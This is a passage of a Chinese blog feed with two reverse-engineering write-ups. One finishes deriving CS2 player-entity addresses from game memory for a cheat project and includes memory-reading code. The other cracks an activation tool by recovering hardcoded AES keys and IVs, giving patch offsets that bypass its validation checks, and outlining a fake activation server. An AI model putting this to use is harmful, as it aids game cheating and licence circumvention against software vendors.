class="params">(__int64 a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rcx</span></span><br><span class="line">  _DWORD *v3; <span class="comment">// rcx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0x7FFE</span></span><br><span class="line">    &amp;&amp; (a2 &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">0x3F</span></span><br><span class="line">    &amp;&amp; (v2 = *(a1 + <span class="number">8</span>i64 * (a2 &gt;&gt; <span class="number">9</span>) + <span class="number">16</span>)) != <span class="number">0</span></span><br><span class="line">    &amp;&amp; (v3 = (<span class="number">120</span>i64 * (a2 &amp; <span class="number">0x1FF</span>) + v2)) != <span class="number">0</span>i64</span><br><span class="line">    &amp;&amp; (v3[<span class="number">4</span>] &amp; <span class="number">0x7FFF</span>) == a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> *v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>a1</code>为全局变量</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/e57d21be29f73db9f074afa0d74fbc52.png" alt="image-20240520131727224" /></p><p><code>a2</code>暂时未知，不过我们可以根据<code>fastcall</code>的传参顺序（ rcx,rdx,r8,r9）或者汇编来看<code>a2</code>传递的是什么参数</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/1e80da8df9ed8dc030ec2e1354cdca80.png" alt="image-20240520132002915" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/618a96bb01c4e8e319836b87c64bd864.png" alt="image-20240520132204382" /></p><p>编写python算法模拟一下，但是条件中内存有指针，那没有两种思路</p><ul><li>利用调试器取值</li><li>直接都程序内存</li></ul><p>这里用第一种，先不管最后一个条件，计算得到<code>v2 = 0000019CA3550808 </code></p><p>然后算出<code>v3 = 0x7ffab466e718</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sub_18060A050</span>():</span><br><span class="line">    a1 = <span class="number">0x000019CA3AD1800</span></span><br><span class="line">    a2 = <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(a1 + <span class="number">8</span> * (a2 &gt;&gt; <span class="number">9</span>) + <span class="number">16</span>))</span><br><span class="line">    v2 = <span class="number">0x000019CA3550808</span></span><br><span class="line">    v3 = <span class="number">120</span> * (a2 &amp; <span class="number">0x1FF</span>) + v2</span><br><span class="line">    <span class="keyword">if</span> (a2 &lt;= <span class="number">0x7FFE</span> </span><br><span class="line">        <span class="keyword">and</span> (a2 &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">0x3F</span> </span><br><span class="line">        <span class="keyword">and</span> v2 != <span class="number">0</span> </span><br><span class="line">        <span class="keyword">and</span> v3 != <span class="number">0</span> </span><br><span class="line">        <span class="comment"># and (v3[4] &amp; 0x7FFF) == a2 </span></span><br><span class="line">        ):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(v3))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sub_18060A050()</span><br></pre></td></tr></table></figure><p>用CE看一下<code>*v3</code>这个指针的值</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/70603ecd33c5dd5aff45e123cf5ac730.png" alt="image-20240520134938594" /></p><p>那么返回的就是<code>00007FFAB4652500</code>，用CE发现是一个叫做<code>CCSPlayerController</code>的数据结构</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/148ea562cc30fcec49e4f2e877ff07a5.png" alt="image-20240520135116592" /></p><p>看下github上的偏移表</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/821a5581345960a5be6fd1469edc1d23.png" alt="image-20240520135214649" /></p><p>发现有几处关键信息：</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/c7427d9bdc9c0d6f6717db68fb4e7161.png" alt="image-20240520135330110" /></p><p>这样就可以通过<code>client.dll + 191C5B8</code>加上下标，通过刚才的函数，找到了CCSPlayerController开始的地址</p><h2 id="controller到pawn"><a class="markdownIt-Anchor" href="#controller到pawn"></a> Controller到Pawn</h2><p>我们继续逆向，根据<code>Controller+0x7E4</code>为<code>m_hPlayerPawn</code>，就用CE看看这个地址有无读写，在观察下汇编发现</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/0264c4bacfba409a1d39debe1ff21a2a.png" alt="image-20240520141741112" /></p><p>由于CE捕获到的两段代码十分相近，那么给rax赋值的话rax引用就可能出现，搜索对<code>[rax]</code>访问找到</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/225431806308549ed652ad3894124e06.png" alt="image-20240520142242702" /></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">    v11 = *a4;                                  <span class="comment">// //////////////</span></span><br><span class="line">    <span class="keyword">if</span> ( *a4 != <span class="number">-1</span></span><br><span class="line">      &amp;&amp; qword_181819538</span><br><span class="line">      &amp;&amp; v11 != <span class="number">-2</span></span><br><span class="line">      &amp;&amp; (v12 = *(qword_181819538 + <span class="number">8</span> * ((v11 &amp; <span class="number">0x7FFF</span>) &gt;&gt; <span class="number">9</span>))) != <span class="number">0</span></span><br><span class="line">      &amp;&amp; (v13 = (v12 + <span class="number">120</span>i64 * (v11 &amp; <span class="number">0x1FF</span>))) != <span class="number">0</span>i64</span><br><span class="line">      &amp;&amp; *(v13 + <span class="number">4</span>) == v11 )</span><br><span class="line">    &#123;</span><br><span class="line">      v14 = *v13;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v14 = <span class="number">0</span>i64;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v10 != v14 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v5;</span><br><span class="line">    ++a4;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &gt;= a5 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>v11</code>就是我捕获到的<code>mPawn</code>值，这里再次出现了全局变量<code>client.dll+1819538</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/ff24327da45a69871a68d3633cbad5db.png" alt="image-20240520142752026" /></p><p>同之前编写脚本计算地址，然后再对照，这里就不再赘述过程了。</p><p>得到从<code>CCSPlayerController.mPawn</code>找到对应<code>CSPlayerPawn</code>的方法，这段代码在项目的<code>Cheats</code>的<code>Player</code>类中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Player::GetPawn</span><span class="params">()</span> </span>&#123;</span><br><span class="line">DWORD m_hPlayerPawn = <span class="built_in">GetProcessMem</span>(hProcess, <span class="keyword">this</span>-&gt;PlayerControllerAddr, <span class="number">2</span>, <span class="number">0</span>, CSPlayerController::m_hPlayerPawn);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>-&gt;ClientDLLBase == <span class="number">0</span> || <span class="keyword">this</span>-&gt;hProcess == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">DWORD64 entity_list = <span class="built_in">GetProcessMem</span>(hProcess, <span class="keyword">this</span>-&gt;ClientDLLBase + ClientDLL::C_CSPlayerController, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!entity_list)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">DWORD64 list_entry = <span class="built_in">GetProcessMem</span>(hProcess, entity_list + (<span class="number">8</span> * (<span class="keyword">this</span>-&gt;Index &amp; <span class="number">0x7FFF</span>) &gt;&gt; <span class="number">9</span>) + <span class="number">0x10</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!list_entry)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">DWORD64 playerPawn = m_hPlayerPawn;</span><br><span class="line"><span class="keyword">if</span> (!playerPawn)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">DWORD64 list_entry2 = <span class="built_in">GetProcessMem</span>(hProcess, entity_list + <span class="number">8</span> * ((m_hPlayerPawn &amp; <span class="number">0x7FFF</span>) &gt;&gt; <span class="number">9</span>) + <span class="number">0x10</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!list_entry2)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">this</span>-&gt;PlayerPawnAddr = <span class="built_in">GetProcessMem</span>(hProcess, list_entry2 + ClientDLL::C_CSPlayerController_Gap * (m_hPlayerPawn &amp; <span class="number">0x1FF</span>), <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="controller的数组"><a class="markdownIt-Anchor" href="#controller的数组"></a> Controller的数组</h1><p>到这里算是总结了吧。之前从全局变量找到Controller，有许多没用的比较和逻辑运算，这些是为了对其和限制大小</p><p>找到Controller的就可变为，改代码位于项目的<code>Cheats.cpp</code>中，在<code>Cheats</code>的构造函数中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DWORD64 ListOffsetA = <span class="built_in">GetProcessMem</span>(<span class="keyword">this</span>-&gt;hProcess, <span class="keyword">this</span>-&gt;ClientDLLBase + ClientDLL::C_CSPlayerController, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">DWORD64 v2 = <span class="built_in">GetProcessMem</span>(<span class="keyword">this</span>-&gt;hProcess, ListOffsetA + <span class="number">8</span> * (<span class="number">1</span> &gt;&gt; <span class="number">9</span>) + <span class="number">16</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">this</span>-&gt;ControllerBase = v2 + ClientDLL::C_CSPlayerController_Gap;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/512e6a3c3dee6ba36bfd9202df80173b.png" alt="image-20240520143956409" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;如何结合Cheat Engine和逆向工程找到CS2内存中的人物地址&lt;/p&gt;</summary>
    
    
    
    <category term="program" scheme="https://joe1sn.eu.org/categories/program/"/>
    
    
    <category term="crack" scheme="https://joe1sn.eu.org/tags/crack/"/>
    
    <category term="cheats" scheme="https://joe1sn.eu.org/tags/cheats/"/>
    
  </entry>
  
  <entry>
    <title>【破解】一次无害的Coploit激活工具破解</title>
    <link href="https://joe1sn.eu.org/2024/03/28/crackme-coploit/"/>
    <id>https://joe1sn.eu.org/2024/03/28/crackme-coploit/</id>
    <published>2024-03-28T06:18:41.000Z</published>
    <updated>2025-01-26T14:46:00.784Z</updated>
    
    <content type="html"><![CDATA[<p>难度：⭐</p><p>- 要不要后面把怎么写外挂啥的放上来？还是说开一个知识星球？-</p><span id="more"></span><p>难度一星，一颗给go，一颗给密码学，减一颗给简单的认证过程</p><h1 id="静态分析"><a class="markdownIt-Anchor" href="#静态分析"></a> 静态分析</h1><p>首先是来源</p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/629a93de1f16c97ddc782fa332ec2e2e.png" alt="image-20240328142334526" style="zoom:50%;" /><p>下载Windows版看看</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/c89f58cc8d4e57a7febbb3b28a9abe93.png" alt="image-20240328142559130" /></p><p>哦？golang打包的，看看版本</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; go version .\authTool.exe</span><br><span class="line">.\authTool.exe: go1.<span class="number">21.0</span></span><br></pre></td></tr></table></figure><p>有点难搞啊，有无Go是无符号的，IDA打开看也是一坨</p><h1 id="粗略动态"><a class="markdownIt-Anchor" href="#粗略动态"></a> 粗略动态</h1><p>这个阶段就是看网络活动，文件操作等等，先打开<code>WireShark</code>和<code>Procmon64</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/31e2c85ca1f654ce3c318522defe02c1.png" alt="image-20240328142838195" /></p><p>然后打开软件跑一下</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/be06388ed1da5f3f6edf21e8fe0a4b11.png" alt="image-20240328143029707" /></p><p>这个时候ProcessMonitor已经有了，凭经验来说这里只有网络连接有点价值</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/65f90e11e593ac438eaaf16dcae07212.png" alt="image-20240328143233355" /></p><p>两个IP：<code>43.x.x.x</code>（记为ipA）和<code>149.x.x.x</code>（记为ipB），按照先后顺序看</p><p>在wireshark中<code>ip.addr == 43.x.x.x</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/20358a76784ee006c61ced9e1cc126e0.png" alt="image-20240328143548755" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/f05d636bb0c29798546351a070ffd061.png" alt="image-20240328143744161" /></p><p>在wireshark中<code>ip.addr == 149.x.x.x</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/3a3d09d1f2075bd3a291766be88f7b9f.png" alt="image-20240328144255295" /></p><p>两段都是密文，一眼base64，而且解码完成过后也是乱码，接下来回到你想本身</p><h1 id="动静结合"><a class="markdownIt-Anchor" href="#动静结合"></a> 动静结合</h1><p>根据运行时候的字符串，用golang写过网络请求的小伙伴都知道，网络请求部分是在<code>net</code>库中，立刻在<code>main_main</code>中找到相关</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/3503ac001cc8b3e7579f161d9a8b2604.png" alt="image-20240328145108076" /></p><p>有时间的还在静态跟流程，心急的已经开始用ida动调了</p><h2 id="43xxx"><a class="markdownIt-Anchor" href="#43xxx"></a> 43.x.x.x</h2><p>写过golang的都知道，获得发送完请求的结果需要使用一个<code>ReadAll</code>之类的东西</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/7cb42a1992de2870953ab1af02b7daba.png" alt="image-20240328145645886" /></p><p>看看下面的AES解密</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/28493cae840676bc3cca1bd586f440cd.png" alt="image-20240328145713758" /></p><p>发现有个相关值<code>1234567890123456</code>，但是CBC加密方式的话不知道这个是<code>key</code>还是<code>iv</code>，动态看看</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/e1dd0cb4f3c84a66d33b80062eda7e9e.png" alt="image-20240328145840300" /></p><p>这里<code>slicebytetostring</code>刚好返回，根据汇编的传参，说明接收到的内容可能在<code>RAX</code>寄存器里面</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/5b6937a0583f0c2bb87eb8746fb6da86.png" alt="image-20240328150411467" /></p><p>和wireshark拦截到的报文一样，跟进AES解密看看</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/4872a34c83530c548d73ad5f8a9e0edf.png" alt="image-20240328150500799" /></p><p>这里可以自己确认一下，确实是Base64解码的</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/b8f63dc746e6142d8fbc094e1e044b6b.png" alt="image-20240328151834101" /></p><p>这里看一下<code>crypto_aes_NewCipher</code>，根据Windows下的传参规则，看一下栈和<code>rcx</code>，<code>rdx</code>，<code>r8</code>，<code>r9</code> <code>...</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/558d4083ef42f374961f5fa815011d77.png" alt="image-20240328152054358" /></p><p>那么应该就是Key了</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/251621fe0d79cd536c57e89bc691324d.png" alt="image-20240328150718900" /></p><p>这里要开始解密了对吧，还是看下相关参数</p><p>猜测：这时候的key和iv都是<code>1234567890123456</code>，写个python脚本验证下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_cbc_decrypt</span>(<span class="params">key, iv, ciphertext</span>):</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    plaintext = cipher.decrypt(ciphertext)</span><br><span class="line">    plaintext = unpad(plaintext, AES.block_size)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 密钥和IV（Initialization Vector）</span></span><br><span class="line">    key = <span class="string">b&#x27;1234567890123456&#x27;</span></span><br><span class="line">    iv = <span class="string">b&#x27;1234567890123456&#x27;</span></span><br><span class="line">    ciphertext = base64.b64decode(<span class="string">b&#x27;k9FQxxxxxxxxxxxxxxxxxxx9wy7w==&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解密</span></span><br><span class="line">    plaintext = aes_cbc_decrypt(key, iv, ciphertext)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出解密后的明文</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Decrypted plaintext:\n&quot;</span>, plaintext.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>得到了两个IP，根据后续操作会把解密出的字符串按照<code>,</code>切分开，而且第一个ip就是wireshark得到的，那么就是一个主用，一个备用两个IP</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/4e8202a0421cba9627f44559f8b5dafe.png" alt="image-20240328152657681" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/c816ca26646d4fab48a4a238a21f90a1.png" alt="image-20240328153020248" /></p><h2 id="143xxx"><a class="markdownIt-Anchor" href="#143xxx"></a> 143.x.x.x</h2><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/55bfbd6dc95952f309209799fba04d59.png" alt="image-20240328153057080" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/8d90360b6f7c444f12e76341c51f527e.png" alt="image-20240328153154421" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/dba1bd1ec60b516e0489b1b211857c43.png" alt="image-20240328153647769" /></p><p>这里有个很明显的拼接api的操作，得到url：<code>http://149.x.x.x:8699/api/v</code>，和ipB的流量对上了</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/fc9b121500715223314b7da22858a6b6.png" alt="image-20240328153718535" /></p><p>接着用了和上面一样的解密函数，解密一下看看</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/f1c66826a18679b2e386f0c76db94441.png" alt="image-20240328153927993" /></p><p>发现了一个新的url，记为<code>urlB</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/b56778815fb0c85ffc42c713cc2b49c9.png" alt="image-20240328154034283" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/eb683ff98d23acc7f208875322dee860.png" alt="image-20240328154130156" /></p><p>解析这个json，然后就是一些文件操作，然后来到了输入激活码的地方</p><h2 id="激活"><a class="markdownIt-Anchor" href="#激活"></a> 激活</h2><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/32f31a0ef77265eed3d30cc39c9f4f58.png" alt="image-20240328154349545" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/acebaa815b8afac070f436ac1a2f30f6.png" alt="image-20240328154517796" /></p><p>第一处认证，说明输入的激活码长度要为16，这里后续可能要patch，记一下patch点：<code>00000000006A3CF1</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/12a3d4f2556f9e8c20ffdae87bdaab07.png" alt="image-20240328154705589" /></p><p>这里还有后续都做了一些信息搜集，其中包括有：时间戳，主机名(hostname)，所有网卡的mac，本地IP，还有一个user（可能是正确的激活码才会有的）</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/c0f05c45877b764bf05b002d8dbb26de.png" alt="image-20240328155108207" /></p><p>这里调用了一个<code>main_ec</code>，先看一下截至目前拼接的字符串</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/1cd57ec5e4bb3f6c29515afbd9bcb1e9.png" alt="image-20240328155141755" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/0de9c338c7f0b006867940181870ff75.png" alt="image-20240328155231715" /></p><p>不用认证分析了，功能：加密，key和iv两个都试一下，密文选择后面base64过后的内容</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/ca5a94668dbac66be885ae03eecf75e2.png" alt="image-20240328160202691" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/999097adb13ed0504686ca03d6dd061c.png" alt="image-20240328160242425" /></p><p>最后发现使用，key：<code>1234567890ABCDEF</code>，iv：<code>ABCDEF1234567890</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/0729af5ea300c003fc8e94c3d0fba1cb.png" alt="image-20240328160352591" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/005fbc331117868d3c9de5f3f78f72ae.png" alt="image-20240328160553109" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/595b90a0eb802058cc030c48b42a0727.png" alt="image-20240328160643189" /></p><p>拼接好参数，用最开始通讯的密钥和iv进行加密，使用POST送回服务端，貌似我们距离最后的认证也来越近了</p><h2 id="校验"><a class="markdownIt-Anchor" href="#校验"></a> 校验</h2><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/f2a23063aa38d9de6ae9abd3b4c91551.png" alt="image-20240328161126355" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/c2dc2cea4390441735ea54de46c3b8f5.png" alt="image-20240328161105890" /></p><p>接收到返回后就开始各种比较，那么这里就是校验的地方了，直接nop或者jmp掉就可以了，注意jmp的话栈上面的修改别覆盖了，得到第二个patch的位置：<code>00000000006A4293</code></p><p>这里动态调试我就直接改rip过了</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/776b072899c97c4555bd43f6fc3f1d9f.png" alt="image-20240328161249744" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/267212cc688c5fa796fe0fb187050b82.png" alt="image-20240328161327045" /></p><h2 id="破解coploit"><a class="markdownIt-Anchor" href="#破解coploit"></a> 破解coploit</h2><p>哈哈，你不会真的以为有什么方法能免费试用coploit吧</p><p>无害之处就在于此</p><p>就和chatGPT一样，这个用的时候要联网，联网会验证token，所以这样的token肯定没有在他数据库里面注册过</p><p>这些平台只是做一个流量转发，买几个<code>key</code>然后做个token转换然后卖给大家用而已，是不是割韭菜就仁者见仁智者见智了</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/22c3130c52d0e00b096e9c321edab646.png" alt="image-20240328161936587" /></p><p>根据我所了解的大多是修改js文件等等的操作进行的，后续具体修改插件什么的操作，js相关文件怎么实现的，就不再分析了，点到为止</p><h1 id="打包"><a class="markdownIt-Anchor" href="#打包"></a> 打包</h1><p>截图的地址可能有问题是因为我重新用IDA打开过一次</p><h2 id="0x6a3cf1"><a class="markdownIt-Anchor" href="#0x6a3cf1"></a> 0x6A3CF1</h2><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/049b9079c31f292231c347531bbd9aab.png" alt="image-20240328162119065" /></p><p>nop掉，但是这个内容会返回到服务端，如果服务端默认这个是16个字符串而且使用了下标寻找内容，可能会出问题</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/43da0b7f6494ae69af300c66d51e068d.png" alt="image-20240328162228494" /></p><h2 id="0x6a4293"><a class="markdownIt-Anchor" href="#0x6a4293"></a> 0x6A4293</h2><p>需要注意的是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000006A42B5                 mov     rax, [rsp+0A58h+var_5F0]</span><br><span class="line">.text:00000000006A42BD                 mov     rbx, [rsp+0A58h+var_968]</span><br><span class="line">.text:00000000006A42C5                 mov     rcx, [rsp+0A58h+var_560]</span><br><span class="line">.text:00000000006A42CD                 mov     rdi, [rsp+0A58h+var_8C8]</span><br><span class="line">.text:00000000006A42D5                 mov     rsi, [rsp+0A58h+var_680]</span><br><span class="line">.text:00000000006A42DD                 mov     r8, [rsp+0A58h+var_9C8]</span><br><span class="line">.text:00000000006A42E5                 call    main_writeHostsJSON2</span><br></pre></td></tr></table></figure><p>这段修改了寄存器的值，如果跳过可能对<code>main_writeHostsJSON2</code>有不好的影响，把校验全部nop</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/140e555b7072a7895ccbdb0e9a0b3476.png" alt="image-20240328165823229" /></p><hr /><p>初步达到效果</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/1b49ee80f0fd38cca8e43806ae1aede7.png" alt="image-20240328170337749" /></p><h2 id="网络连接"><a class="markdownIt-Anchor" href="#网络连接"></a> 网络连接</h2><h3 id="思路a"><a class="markdownIt-Anchor" href="#思路a"></a> 思路A</h3><p>根据相关传参，按照一下两次<code>jmp</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text: 00000000006631B9                 call    net_http___Client__Get</span><br><span class="line">.text: 00000000006638D8                 call    os_UserHomeDir</span><br><span class="line">----------------------------------------------------------------------------</span><br><span class="line">.text: 00000000006641B4                 call    net_http___Client__Post</span><br><span class="line">.text: 00000000006642B5                 mov     rax, [rsp+0A58h+var_5F0]</span><br></pre></td></tr></table></figure><h3 id="思路b"><a class="markdownIt-Anchor" href="#思路b"></a> 思路B</h3><p>修改域名和ip为自己的，自己搭一套服务</p><ol><li><p>urlA的网络模拟</p><p><code>urls</code> =<code> authURL_A</code>+“,”+<code>authURL_B</code></p><p>使用Key-iv = <code>1234567890123456</code>-<code>1234567890123456</code>进行AES-CBC加密<code>urls </code>并返回</p></li><li><p>urlB的网络模拟</p><p>返回如下json值</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span 